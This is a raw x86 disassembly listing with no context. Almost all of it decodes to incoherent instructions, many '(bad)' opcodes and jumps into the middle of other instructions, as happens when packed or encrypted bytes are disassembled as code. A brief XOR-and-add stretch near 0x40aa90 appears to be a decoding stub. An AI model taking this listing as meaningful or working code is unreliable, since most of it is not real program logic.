  40a792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a793:	mov    al,0xdd
  40a795:	and    dh,bl
  40a797:	inc    edi
  40a798:	dec    eax
  40a799:	js     0x40a7cc
  40a79b:	dec    ebx
  40a79c:	mov    edx,0x2d0181ce
  40a7a1:	lds    eax,FWORD PTR [eax]
  40a7a3:	sahf   
  40a7a4:	xor    ebx,DWORD PTR [ecx]
  40a7a6:	xchg   edi,eax
  40a7a7:	rol    BYTE PTR [edx],1
  40a7a9:	pop    ds
  40a7aa:	xor    BYTE PTR [edx],dl
  40a7ac:	(bad)  
  40a7ad:	mov    al,ds:0x82c618ce
  40a7b2:	sbb    eax,0xa7314833
  40a7b7:	inc    edx
  40a7b8:	cmp    eax,0x87c1e227
  40a7bd:	fstp   QWORD PTR [ebx-0x5faf6ab0]
  40a7c3:	mov    ecx,0x5d1a45f5
  40a7c8:	mov    bl,0xa7
  40a7ca:	mov    al,0xf9
  40a7cc:	inc    ebp
  40a7cd:	(bad)  
  40a7ce:	mov    ecx,0xd0023581
  40a7d3:	mov    ebp,0xfae3d339
  40a7d8:	mov    ch,BYTE PTR [ecx]
  40a7da:	xor    DWORD PTR [ebp+0x71],eax
  40a7dd:	add    dh,BYTE PTR [eax]
  40a7df:	ja     0x40a7e7
  40a7e1:	mov    ds:0xf44d26b7,al
  40a7e6:	ins    BYTE PTR es:[edi],dx
  40a7e7:	dec    edx
  40a7e8:	std    
  40a7e9:	shr    BYTE PTR [ebx],0x94
  40a7ec:	xchg   edx,eax
  40a7ed:	adc    al,0x1f
  40a7ef:	xor    eax,0x180880d6
  40a7f4:	mov    ebp,0xc6fcbf63
  40a7f9:	popa   
  40a7fa:	cmp    BYTE PTR [ebx+ebx*1-0x7eb04a1b],bh
  40a801:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a802:	fsubr  st(3),st
  40a804:	or     DWORD PTR [edi],edx
  40a806:	jl     0x40a872
  40a808:	adc    BYTE PTR [esi-0x2b],al
  40a80b:	adc    DWORD PTR [edx+0x35fb9222],eax
  40a811:	aaa    
  40a812:	rol    BYTE PTR [ebx-0x4dbfca5d],1
  40a818:	repnz mov ds:0x19b2d3f6,al
  40a81e:	cs inc eax
  40a820:	pushf  
  40a821:	mov    ebp,0x95e5dd86
  40a826:	retf   
  40a827:	pop    es
  40a828:	aam    0x67
  40a82a:	int3   
  40a82b:	pop    ebp
  40a82c:	rol    DWORD PTR [ebx+0x74],cl
  40a82f:	sbb    eax,0x6860f78f
  40a834:	cmc    
  40a835:	mov    bh,0xb
  40a837:	mov    al,ds:0x41903651
  40a83c:	add    DWORD PTR [esi+0x60628972],edi
  40a842:	shl    BYTE PTR [edi-0x5a],cl
  40a845:	sbb    dl,BYTE PTR [esi]
  40a847:	and    esp,DWORD PTR [eax-0x68]
  40a84a:	mov    bl,0x1
  40a84c:	(bad)  
  40a84d:	pop    es
  40a84e:	xchg   ecx,eax
  40a84f:	aad    0x6a
  40a851:	pop    es
  40a852:	xor    DWORD PTR [esi+0xc],0xffffffc0
  40a856:	sti    
  40a857:	dec    ecx
  40a858:	or     eax,0xf850767e
  40a85d:	add    al,0xa
  40a85f:	inc    ebx
  40a860:	fninit 
  40a862:	or     dl,BYTE PTR [ecx]
  40a864:	jle    0x40a84e
  40a866:	pop    ecx
  40a867:	inc    esp
  40a868:	mov    ebx,0xb0f96727
  40a86d:	adc    eax,DWORD PTR [esi-0x5e]
  40a870:	inc    eax
  40a871:	jmp    0x40a857
  40a873:	lea    eax,[ecx+ebp*4-0x2]
  40a877:	out    dx,eax
  40a878:	aas    
  40a879:	lock dec esp
  40a87b:	(bad)  
  40a87c:	sbb    eax,0xa18b0911
  40a881:	xlat   BYTE PTR ds:[ebx]
  40a882:	mov    esp,0x6ffa00f0
  40a887:	adc    BYTE PTR [ebp+0x14],ah
  40a88a:	cmp    al,al
  40a88c:	daa    
  40a88d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a88e:	mov    ch,0xf
  40a890:	std    
  40a891:	inc    esi
  40a892:	xor    eax,0xd1dc6291
  40a897:	out    dx,eax
  40a898:	add    al,0xe1
  40a89a:	sbb    eax,0x4dbf4287
  40a89f:	jge    0x40a8e8
  40a8a1:	shl    edi,cl
  40a8a3:	shl    DWORD PTR [eax],cl
  40a8a5:	imul   edi,DWORD PTR [ebx],0x3a
  40a8a8:	(bad)  
  40a8a9:	cmp    eax,0x8f3b12f6
  40a8ae:	clc    
  40a8af:	xor    BYTE PTR [ebx],ch
  40a8b1:	push   ss
  40a8b2:	test   DWORD PTR [edx+0x34],ebx
  40a8b5:	shl    DWORD PTR [edx-0x73],0x1f
  40a8b9:	ret    0x2f56
  40a8bc:	jno    0x40a86a
  40a8be:	xor    al,0x6f
  40a8c0:	and    al,al
  40a8c2:	call   0xe8b5:0x95b1e840
  40a8c9:	das    
  40a8ca:	mov    ebp,DWORD PTR [ecx+ebx*8+0x1cae2c20]
  40a8d1:	mov    eax,0xbbd1d9b7
  40a8d6:	xchg   esi,eax
  40a8d7:	inc    eax
  40a8d8:	(bad)  
  40a8d9:	out    dx,eax
  40a8da:	and    BYTE PTR [ebx],cl
  40a8dc:	dec    esp
  40a8dd:	push   esp
  40a8de:	imul   dh
  40a8e0:	ds ins BYTE PTR es:[edi],dx
  40a8e2:	sub    eax,0x8e277c00
  40a8e7:	popfw  
  40a8e9:	int    0xfc
  40a8eb:	jo     0x40a8e8
  40a8ed:	push   esp
  40a8ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8ef:	mov    ecx,0xdf289200
  40a8f4:	push   esp
  40a8f5:	cmp    BYTE PTR [eax+0x2a088432],dl
  40a8fb:	xchg   edi,eax
  40a8fc:	mov    edx,0x44edf709
  40a901:	ja     0x40a8be
  40a903:	das    
  40a904:	add    bl,bh
  40a906:	repz sub BYTE PTR [esp+eax*8],ch
  40a90a:	pop    ebx
  40a90b:	pop    ds
  40a90c:	ins    BYTE PTR es:[edi],dx
  40a90d:	jmp    0x40a96a
  40a90f:	dec    DWORD PTR [eax+0x39]
  40a912:	retf   
  40a913:	cmp    DWORD PTR [edx+0x5ab50c11],ebp
  40a919:	hlt    
  40a91a:	mov    esi,0x941080cb
  40a91f:	push   ebp
  40a920:	aam    0xeb
  40a922:	test   BYTE PTR [edx-0x3a4d8f21],ah
  40a928:	mov    esi,0x62f05ee4
  40a92d:	xchg   esp,eax
  40a92e:	fsub   st(0),st
  40a930:	add    edx,esi
  40a932:	add    dl,BYTE PTR [esi+0x70]
  40a935:	clc    
  40a936:	inc    esp
  40a937:	retf   0xcf40
  40a93a:	and    edi,DWORD PTR [ebp-0x4b2a79d0]
  40a940:	sub    BYTE PTR [esp+ebx*1+0x3a13d25a],0x5d
  40a948:	aad    0xd8
  40a94a:	pop    esi
  40a94b:	cmovb  ecx,ebp
  40a94e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a94f:	mov    ecx,0x1e03f292
  40a954:	repnz xor ebp,DWORD PTR [ebx+0x5d53975f]
  40a95b:	js     0x40a969
  40a95d:	call   FWORD PTR [edx]
  40a95f:	call   0x31af:0x856c263a
  40a966:	test   BYTE PTR [eax+0x7e6bd045],0xc1
  40a96d:	sbb    BYTE PTR [eax-0xd0f307c],bh
  40a973:	mov    cl,0x88
  40a975:	jmp    0x40a95b
  40a977:	out    0xd0,al
  40a979:	pop    eax
  40a97a:	add    al,0x1b
  40a97c:	enter  0xd12d,0x20
  40a980:	sbb    al,0x26
  40a982:	iret   
  40a983:	inc    esi
  40a984:	jmp    0x6fa5:0xc4ccf1a7
  40a98b:	sahf   
  40a98c:	pop    ds
  40a98d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a98e:	mov    dl,0xd8
  40a990:	jbe    0x40a921
  40a992:	pusha  
  40a993:	jl     0x40a92b
  40a995:	sbb    al,0x74
  40a997:	test   BYTE PTR [esi],0x25
  40a99a:	enter  0xccc6,0x59
  40a99e:	inc    ecx
  40a99f:	push   ss
  40a9a0:	sbb    al,0xd1
  40a9a2:	xchg   edi,eax
  40a9a3:	(bad)
  40a9a7:	sub    al,0xf4
  40a9a9:	(bad)  
  40a9aa:	leave  
  40a9ab:	inc    ebp
  40a9ac:	and    eax,0x77d109ac
  40a9b1:	aas    
  40a9b2:	mov    cl,0xff
  40a9b4:	sbb    al,0x0
  40a9b6:	ds cmp al,0xa7
  40a9b9:	(bad)  
  40a9ba:	leave  
  40a9bb:	bound  eax,QWORD PTR [ebx]
  40a9bd:	int3   
  40a9be:	jecxz  0x40a98d
  40a9c0:	xor    BYTE PTR [ebx-0x8ce828a],ch
  40a9c6:	out    0x3d,eax
  40a9c8:	shl    BYTE PTR [ebp+ecx*8-0x174fc1ea],cl
  40a9cf:	fcomp  QWORD PTR [ebp-0x58]
  40a9d2:	pop    ebp
  40a9d3:	pop    ds
  40a9d4:	aas    
  40a9d5:	jmp    0x40a9fb
  40a9d7:	inc    edi
  40a9d8:	sub    dl,BYTE PTR [eax-0x3d]
  40a9db:	push   esi
  40a9dc:	or     DWORD PTR [ecx-0x52989227],edx
  40a9e2:	mov    eax,ds:0x404545c
  40a9e7:	mov    dl,0xe1
  40a9e9:	push   0x6e
  40a9eb:	dec    esp
  40a9ec:	stc    
  40a9ed:	mov    DWORD PTR [ebp+0x54ad637f],eax
  40a9f3:	(bad)  
  40a9f4:	out    dx,al
  40a9f5:	mov    ebp,0x348b372b
  40a9fa:	fild   DWORD PTR [ebx]
  40a9fc:	push   edx
  40a9fd:	lods   eax,DWORD PTR ds:[esi]
  40a9fe:	cmp    eax,0x519cb4a6
  40aa03:	mov    al,BYTE PTR [ecx]
  40aa05:	lahf   
  40aa06:	sbb    al,0xe8
  40aa08:	je     0x40aa4c
  40aa0a:	fs popf 
  40aa0c:	dec    ecx
  40aa0d:	nop
  40aa0e:	fsubr  st(4),st
  40aa10:	(bad)  
  40aa11:	call   DWORD PTR [eax-0x29]
  40aa14:	nop
  40aa15:	fmulp  st(7),st
  40aa17:	jecxz  0x40a9e6
  40aa19:	inc    ebx
  40aa1a:	jno    0x40aa1e
  40aa1c:	in     eax,dx
  40aa1d:	xor    al,0x97
  40aa1f:	test   al,0xcc
  40aa21:	and    al,0xc
  40aa23:	sub    esi,DWORD PTR [ecx]
  40aa25:	out    0x6a,al
  40aa27:	inc    edi
  40aa28:	cmp    DWORD PTR [ebp+0x4e536b2b],edi
  40aa2e:	hlt    
  40aa2f:	sub    eax,0x886197d2
  40aa34:	pop    eax
  40aa35:	inc    ebx
  40aa36:	out    0xd3,al
  40aa38:	or     dl,BYTE PTR [edx]
  40aa3a:	xchg   DWORD PTR [ebp+0x5e346785],edx
  40aa40:	jmp    0xf2858ada
  40aa45:	ja     0x40aa37
  40aa47:	sbb    al,0x1b
  40aa49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa4a:	(bad)  
  40aa4b:	ins    DWORD PTR es:[edi],dx
  40aa4c:	and    eax,0x238e0338
  40aa51:	aas    
  40aa52:	ret    
  40aa53:	shl    ebx,cl
  40aa55:	lahf   
  40aa56:	gs sub al,0x3d
  40aa59:	and    eax,0x10dbf689
  40aa5e:	and    BYTE PTR [eax+0x79b153a1],bh
  40aa64:	mov    edi,0x128e8915
  40aa69:	jns    0x40aa5e
  40aa6b:	push   cs
  40aa6c:	add    cl,cl
  40aa6e:	out    0x12,eax
  40aa70:	pop    edx
  40aa71:	mov    gs,edi
  40aa73:	cmp    BYTE PTR [edi+0x77],al
  40aa76:	or     DWORD PTR [esi],0xff63ed96
  40aa7c:	and    eax,0x79801360
  40aa81:	daa    
  40aa82:	(bad)  
  40aa83:	xchg   ecx,eax
  40aa84:	scas   al,BYTE PTR es:[edi]
  40aa85:	or     eax,0x3d711ad4
  40aa8a:	loope  0x40aa94
  40aa8c:	mov    ch,0x4b
  40aa8e:	hlt    
  40aa8f:	inc    esi
  40aa90:	xor    eax,ecx
  40aa92:	mov    edx,0x3272db
  40aa97:	add    eax,edx
  40aa99:	mov    DWORD PTR [ebp+0x8],eax
  40aa9c:	mov    eax,DWORD PTR [ebp-0x14]
  40aa9f:	xor    eax,ecx
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0x4d8765bc
  40aacc:	jmp    0x40ab22
  40aace:	hlt    
  40aacf:	bound  esp,QWORD PTR [edx+0x10]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx+0x55]
  40aad6:	(bad)  
  40aad7:	sub    eax,0x7e91cb32
  40aadc:	loop   0x40ab10
  40aade:	jnp    0x40ab00
  40aae0:	(bad)  
  40aae1:	sub    dh,BYTE PTR [ebx+0x3c]
  40aae4:	inc    ebx
  40aae5:	retf   
  40aae6:	mov    ebx,DWORD PTR [ecx+0x5f]
  40aae9:	pop    es
  40aaea:	loop   0x40aaeb
  40aaec:	add    ch,cl
  40aaee:	pop    edi
  40aaef:	pop    esi
  40aaf0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaf1:	sbb    al,0x11
  40aaf3:	fwait
  40aaf4:	jno    0x40aa88
  40aaf6:	dec    eax
  40aaf7:	imul   eax,edi,0x69a4ceeb
  40aafd:	stos   DWORD PTR es:[edi],eax
  40aafe:	and    dl,BYTE PTR [ebx]
  40ab00:	mov    dl,0x3f
  40ab02:	mov    bl,0x5c
  40ab04:	or     al,0x1b
  40ab06:	dec    ebp
  40ab07:	mov    esp,0x8fca4983
  40ab0c:	jnp    0x40aa95
  40ab0e:	std    
  40ab0f:	outs   dx,DWORD PTR ds:[esi]
  40ab10:	mov    bl,BYTE PTR [eax-0x3914e8de]
  40ab16:	jecxz  0x40aab2
  40ab18:	retf   
  40ab19:	fdiv   QWORD PTR [esi]
  40ab1b:	ret    0xc0cd
  40ab1e:	cli    
  40ab1f:	mov    ebx,0xdb01169a
  40ab24:	xchg   ebx,eax
  40ab25:	push   ds
  40ab26:	ror    DWORD PTR [eax+ebx*1+0x740b7162],cl
  40ab2d:	push   ecx
  40ab2e:	(bad)  
  40ab2f:	push   esp
  40ab31:	lock sbb al,0xf5
  40ab34:	inc    esi
  40ab35:	inc    eax
  40ab36:	inc    ecx
  40ab37:	int3   
  40ab38:	js     0x40ab02
  40ab3a:	(bad)  
  40ab3b:	sahf   
  40ab3c:	add    edx,DWORD PTR [esi]
  40ab3e:	sub    ebx,esi
  40ab40:	stos   BYTE PTR es:[edi],al
  40ab41:	inc    ecx
  40ab42:	or     eax,0x62d0152c
  40ab47:	lea    ebx,[ebp-0x56]
  40ab4a:	ret    0xdc49
  40ab4d:	outs   dx,BYTE PTR ds:[esi]
  40ab4e:	and    al,0xf3
  40ab50:	dec    esi
  40ab51:	mov    dl,0x19
  40ab53:	ret    0x701b
  40ab56:	pop    ebp
  40ab57:	cli    
  40ab58:	push   ss
  40ab59:	iret   
  40ab5a:	mov    ebp,0x8c132280
  40ab5f:	inc    esp
  40ab60:	push   0xffffffdd
  40ab62:	push   ecx
  40ab63:	(bad)  
  40ab64:	rol    BYTE PTR [edi],0xfd
  40ab67:	imul   esi,DWORD PTR [esi+0x57],0x7051f15
  40ab6e:	(bad)  
  40ab6f:	cmp    BYTE PTR [esi+0x60],cl
  40ab72:	xchg   ebx,eax
  40ab73:	sub    esp,DWORD PTR [ebp-0x6b]
  40ab76:	dec    ebx
  40ab77:	cmp    ch,dl
  40ab79:	mov    al,ds:0x79e644df
  40ab7e:	repz add BYTE PTR [ecx],0x6b
  40ab82:	mov    dl,BYTE PTR [edi+edi*2]
  40ab85:	leave  
  40ab86:	or     BYTE PTR ss:[esp+edi*1],0xdd
  40ab8b:	hlt    
  40ab8c:	dec    ebp
  40ab8d:	mov    bh,0x1c
  40ab8f:	(bad)  
  40ab90:	jp     0x40abac
  40ab92:	pop    ebx
  40ab93:	ins    BYTE PTR es:[edi],dx
  40ab94:	mov    ds:0xd6835f54,eax
  40ab99:	sub    BYTE PTR [eax-0x23],dh
  40ab9c:	sub    esi,DWORD PTR [ebx-0x32a66ab7]
  40aba2:	leave  
  40aba3:	lods   al,BYTE PTR ds:[si]
  40aba5:	ins    BYTE PTR es:[edi],dx
  40aba6:	inc    ecx
  40aba7:	call   0x2d85a669
  40abac:	sub    eax,0x62ba6e66
  40abb1:	xor    BYTE PTR [ecx],bh
  40abb3:	int3   
  40abb4:	repnz shl bh,1
  40abb7:	inc    ebp
  40abb8:	sub    bh,BYTE PTR [edi+0x77]
  40abbb:	mov    bh,0x58
  40abbd:	bound  edx,QWORD PTR [esp+edx*8+0x33]
  40abc1:	adc    DWORD PTR [eax+0xadf41bf],edx
  40abc7:	shl    BYTE PTR [ecx-0x12c6ced1],cl
  40abcd:	adc    edx,0xa
  40abd0:	jne    0x40ac41
  40abd2:	push   es
  40abd3:	in     eax,dx
  40abd4:	dec    edx
  40abd5:	call   0xbe19e487
  40abda:	fiadd  WORD PTR [esi+edi*4+0xc4cb254]
  40abe1:	inc    edx
  40abe2:	fisubr DWORD PTR [eax+eiz*1+0x7badaeef]
  40abe9:	aad    0x68
  40abeb:	and    eax,0x7f1a2d03
  40abf0:	xchg   ecx,eax
  40abf1:	inc    esp
  40abf2:	mov    al,0xb6
  40abf4:	repz jns 0x40ac03
  40abf7:	mov    eax,ds:0xd4a2a574
  40abfc:	add    bl,ch
  40abfe:	jns    0x40ac0f
  40ac00:	push   ss
  40ac01:	fs mov ecx,0x8b16690e
  40ac07:	mov    BYTE PTR [ecx+ecx*8-0x40],bl
  40ac0b:	leave  
  40ac0c:	(bad)  
  40ac0d:	xor    al,0x58
  40ac0f:	outs   dx,DWORD PTR ds:[esi]
  40ac10:	out    0x57,al
  40ac12:	inc    esi
  40ac13:	sub    DWORD PTR [edi+0x59f5fa4e],0xa2ce5167
  40ac1d:	mov    ecx,0x4a9e35a1
  40ac22:	mov    eax,0x49857085
  40ac27:	lahf   
  40ac28:	out    0x8e,al
  40ac2a:	sbb    DWORD PTR [ecx-0x4c5234be],esp
  40ac30:	push   0x80627f8e
  40ac35:	mov    eax,0x8801fb43
  40ac3a:	add    eax,0x2f11689c
  40ac3f:	aas    
  40ac40:	js     0x40ac92
  40ac42:	xchg   edx,eax
  40ac43:	pop    ebp
  40ac44:	push   edx
  40ac45:	pop    DWORD PTR [eax+edi*2+0x560163ba]
  40ac4c:	sub    DWORD PTR [esi-0xb],0xffffffb1
  40ac50:	xchg   edi,eax
  40ac51:	inc    esp
  40ac52:	push   cs
  40ac53:	into   
  40ac54:	xchg   ebx,eax
  40ac55:	adc    DWORD PTR [ebp+0x29],0xb37a1122
  40ac5c:	scas   al,BYTE PTR es:[edi]
  40ac5d:	mov    ?,WORD PTR [ebp+0x35d0c058]
  40ac63:	es wrmsr 
  40ac66:	aaa    
  40ac67:	pop    eax
  40ac68:	fisttp WORD PTR [edx+ebx*4]
  40ac6b:	stos   DWORD PTR es:[edi],eax
  40ac6c:	jno    0x40ac8a
  40ac6e:	loopne 0x40ac97
  40ac70:	test   BYTE PTR [ecx-0x2bc49268],al
  40ac76:	scas   al,BYTE PTR es:[edi]
  40ac77:	adc    DWORD PTR [ebp+0x6b],eax
  40ac7a:	cmp    BYTE PTR [eax-0x7a],dl
  40ac7d:	xor    BYTE PTR [ebx-0x5884af6b],0x88
  40ac84:	jae    0x40aca7
  40ac86:	in     eax,dx
  40ac87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac88:	pop    ebp
  40ac89:	mov    ebp,0xbc6dcca4
  40ac8e:	push   ebp
  40ac8f:	mov    cl,0xe6
  40ac91:	or     DWORD PTR [eax+0x48e0afd4],esi
  40ac97:	xchg   esi,eax
  40ac98:	cmp    ch,BYTE PTR ds:0x685e4f39
  40ac9e:	pop    ecx
  40ac9f:	xchg   esp,eax
  40aca0:	int    0xcd
  40aca2:	aaa    
  40aca3:	inc    eax
  40aca4:	(bad)  
  40aca5:	aaa    
  40aca6:	mov    BYTE PTR [esi+0x6f],dl
  40aca9:	sti    
  40acaa:	sub    dh,dl
  40acac:	repnz int 0x9
  40acaf:	cmp    eax,0xf03c31ca
  40acb4:	adc    edx,DWORD PTR [esi-0x2c]
  40acb7:	imul   edi,DWORD PTR [ebx],0xa856abbb
  40acbd:	das    
  40acbe:	dec    esp
  40acbf:	loopne 0x40acfa
  40acc1:	iret   
  40acc2:	dec    esi
  40acc3:	clc    
  40acc4:	xchg   edx,eax
  40acc5:	xor    eax,0x182de92f
  40acca:	fdiv   DWORD PTR [edi-0x33c590c3]
  40acd0:	inc    ebp
  40acd1:	and    esp,edi
  40acd3:	push   ebp
  40acd4:	sbb    cl,dh
  40acd6:	xor    BYTE PTR [ebp-0x431448ff],ah
  40acdc:	adc    eax,0xffffffc2
  40acdf:	mov    dl,cl
  40ace1:	int    0x7a
  40ace3:	mov    bl,BYTE PTR [ebx]
  40ace5:	sub    BYTE PTR [esi-0x54],0xf8
  40ace9:	cmp    ecx,DWORD PTR [ebx-0xd]
  40acec:	dec    ebx
  40aced:	shr    BYTE PTR [edi],0xf2
  40acf0:	fwait
  40acf1:	mov    ch,0xc
  40acf3:	fdivr  DWORD PTR [ecx+0x794b0ce7]
  40acf9:	je     0x40acf9
  40acfb:	test   eax,0x7645992d
  40ad00:	fwait
  40ad01:	jg     0x40acf1
  40ad03:	nop
  40ad04:	sub    DWORD PTR [ebx-0x4db13cce],esp
  40ad0a:	jge    0x40acf3
  40ad0c:	neg    edi
  40ad0e:	test   al,0xb1
  40ad10:	add    BYTE PTR [eax],dl
  40ad12:	ret    
  40ad13:	xchg   ebx,eax
  40ad14:	inc    edi
  40ad15:	loope  0x40ad73
  40ad17:	push   es
  40ad18:	je     0x40ad6d
  40ad1a:	mov    bh,0xbd
  40ad1c:	or     BYTE PTR [esi+0xd],ch
  40ad1f:	and    bh,dl
  40ad21:	pop    ebx
  40ad22:	mov    ebx,0x8541fcec
  40ad27:	stos   BYTE PTR es:[edi],al
  40ad28:	(bad)  
  40ad29:	or     edx,DWORD PTR [edi+edx*4]
  40ad2c:	push   edx
  40ad2d:	call   0x471e01ba
  40ad32:	cld    
  40ad33:	popf   
  40ad34:	ror    BYTE PTR [ebp-0x5c],0x2a
  40ad38:	inc    ebp
  40ad39:	les    edx,FWORD PTR [esi+0x73]
  40ad3c:	push   ebx
  40ad3d:	in     eax,dx
  40ad3e:	inc    esp
  40ad3f:	mov    bl,BYTE PTR [ebx-0x1d98aec6]
  40ad45:	xchg   edx,eax
  40ad46:	mov    ebp,0x425e25bf
  40ad4b:	(bad)  
  40ad4c:	imul   ebp,eax,0x5a
  40ad4f:	push   ebx
  40ad50:	xor    esi,DWORD PTR [ebx-0x3f]
  40ad53:	pop    edi
  40ad54:	mov    al,gs:0xc85d0b49
  40ad5a:	call   0x9c34:0x33db3485
  40ad61:	arpl   di,bx
  40ad63:	mov    bl,BYTE PTR [eax]
  40ad65:	mov    WORD PTR [edi-0x6d],fs
  40ad68:	sbb    dh,BYTE PTR [ecx+0x423c4c0d]
  40ad6e:	add    al,0xe2
  40ad70:	test   BYTE PTR gs:[esi],0xab
  40ad74:	inc    esi
  40ad75:	add    cl,ah
  40ad77:	ins    BYTE PTR es:[edi],dx
  40ad78:	scas   eax,DWORD PTR es:[edi]
  40ad79:	and    ch,bl
  40ad7b:	loopne 0x40ad94
  40ad7d:	inc    esi
  40ad7e:	add    edi,0x297f7a2c
  40ad84:	xlat   BYTE PTR ds:[ebx]
  40ad85:	(bad)  
  40ad86:	std    
  40ad87:	dec    eax
  40ad88:	lock out dx,al
  40ad8a:	imul   ecx,ecx,0xb7b67a5a
  40ad90:	mov    ecx,DWORD PTR [ecx-0x37cc6da4]
  40ad96:	adc    al,0x1d
  40ad98:	imul   eax,DWORD PTR [eax-0x3058c834],0x52
  40ad9f:	and    cl,0xa9
  40ada2:	loopne 0x40ad6a
  40ada4:	stc    
  40ada5:	jp     0x40adcb
  40ada7:	jns    0x40adc0
  40ada9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adaa:	xchg   esp,eax
  40adab:	adc    eax,0x9ba1a91d
  40adb0:	arpl   ax,si
  40adb2:	jg     0x40ad60
  40adb4:	and    eax,0x6adda960
  40adb9:	fdivr  QWORD PTR [ecx+0x7209955e]
  40adbf:	inc    esi
  40adc0:	shl    esi,0x35
  40adc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adc4:	ror    BYTE PTR [esi+0x2123eda6],0x37
  40adcb:	mov    edi,0xef7199f0
  40add0:	arpl   bp,cx
  40add2:	add    BYTE PTR [di],al
  40add5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40add6:	inc    ebx
  40add7:	jb     0x40ae19
  40add9:	repz adc eax,0x7a5e25b4
  40addf:	pop    ds
  40ade0:	mul    dl
  40ade2:	dec    eax
  40ade3:	ins    BYTE PTR es:[edi],dx
  40ade4:	icebp  
  40ade5:	les    ebp,FWORD PTR [esi]
  40ade7:	xor    al,0xaa
  40ade9:	pop    esp
  40adea:	cmp    eax,DWORD PTR [ebx]
  40adec:	dec    ebx
  40aded:	hlt    
  40adee:	jbe    0x40ae35
  40adf0:	icebp  
  40adf1:	loop   0x40adf2
  40adf3:	(bad)
  40adf6:	dec    esi
  40adf7:	retf   0x9aba
  40adfa:	xchg   ebp,eax
  40adfb:	xlat   BYTE PTR ds:[ebx]
  40adfc:	mov    eax,0xef46dc86
  40ae01:	inc    edi
  40ae02:	iret   
  40ae03:	push   edi
  40ae04:	and    ebp,DWORD PTR [edx-0x48deeb77]
  40ae0a:	xor    DWORD PTR [edi+0x4b],esi
  40ae0d:	outs   dx,BYTE PTR ds:[esi]
  40ae0e:	imul   ecx,DWORD PTR [edi+0x78],0xffffff91
  40ae12:	xlat   BYTE PTR ds:[ebx]
  40ae13:	xor    dh,al
  40ae15:	mov    ebx,ebx
  40ae17:	test   BYTE PTR [edx-0x1b680605],dh
  40ae1d:	and    dl,al
  40ae1f:	mov    edi,DWORD PTR [eax+0x4f]
  40ae22:	(bad)
  40ae26:	xor    eax,0x205863e1
  40ae2b:	shl    BYTE PTR [edx+0x5ebfcfdc],1
  40ae31:	sbb    ch,al
  40ae33:	mov    ebp,0x2d5295c0
  40ae38:	jle    0x40ade7
  40ae3a:	sub    eax,0x73620874
  40ae3f:	mov    bl,0x1f
  40ae41:	sbb    DWORD PTR [esi+0x142ef0d5],esi
  40ae47:	jb     0x40ae94
  40ae49:	xchg   ebx,eax
  40ae4a:	push   ebp
  40ae4b:	shr    BYTE PTR [esi+0x664fd81a],0x2
  40ae52:	cs pop ebp
  40ae54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae55:	adc    DWORD PTR [ecx],ebx
  40ae57:	or     esp,ecx
  40ae59:	xchg   edx,eax
  40ae5a:	(bad)  
  40ae5c:	jmp    0x4a4fbc45
  40ae61:	or     al,0x52
  40ae63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae64:	or     DWORD PTR [edi+0xe003d],esi
  40ae6a:	xchg   ebp,eax
  40ae6b:	leave  
  40ae6c:	cmp    DWORD PTR [ebx+eiz*2-0x7765120f],0xffffff81
  40ae74:	hlt    
  40ae75:	sub    edx,DWORD PTR [esp+eax*1-0x3500c01b]
  40ae7c:	sbb    al,0xa2
  40ae7e:	ds (bad) 
  40ae80:	cmc    
  40ae81:	dec    ebx
  40ae82:	sub    DWORD PTR [ebx+0x4926153f],eax
  40ae88:	or     dh,BYTE PTR [ebp-0x10]
  40ae8b:	les    esi,FWORD PTR fs:[ecx-0x3172c2ee]
  40ae92:	sub    BYTE PTR ds:0xdd959a08,0x47
  40ae99:	and    BYTE PTR [eax+0x17],ah
  40ae9c:	inc    BYTE PTR [eax+edx*2]
  40ae9f:	inc    eax
  40aea0:	inc    esp
  40aea1:	inc    ebx
  40aea2:	test   DWORD PTR [edx+0x1fb3550d],ebp
  40aea8:	ins    DWORD PTR es:[edi],dx
  40aea9:	push   ds
  40aeaa:	mov    al,ds:0xa9606423
  40aeaf:	push   0x75
  40aeb1:	lea    esp,[edx+0x2b3e555]
  40aeb7:	repz fist DWORD PTR [ecx+ebp*8]
  40aebb:	cmp    DWORD PTR [edx-0x4ff39ee1],esi
  40aec1:	imul   edx,esp,0x6a
  40aec4:	mov    edx,0xd58834fc
  40aec9:	icebp  
  40aeca:	pop    ebp
  40aecb:	stos   BYTE PTR es:[edi],al
  40aecc:	jmp    0x40aecb
  40aece:	add    ah,BYTE PTR [edx-0x43]
  40aed1:	ficom  DWORD PTR [eax]
  40aed3:	(bad)  
  40aed4:	pop    ds
  40aed5:	jne    0x40af1b
  40aed7:	mov    dh,0x31
  40aed9:	sbb    ecx,esi
  40aedb:	and    ah,ah
  40aedd:	pop    ds
  40aede:	loop   0x40af0b
  40aee0:	int3   
  40aee1:	cs in  al,dx
  40aee3:	sbb    BYTE PTR [ebp+0x27],ah
  40aee6:	jne    0x40aeae
  40aee8:	ins    DWORD PTR es:[edi],dx
  40aee9:	jnp    0x40af23
  40aeeb:	dec    edi
  40aeec:	pop    ecx
  40aeed:	neg    BYTE PTR [edi+edi*4-0xa]
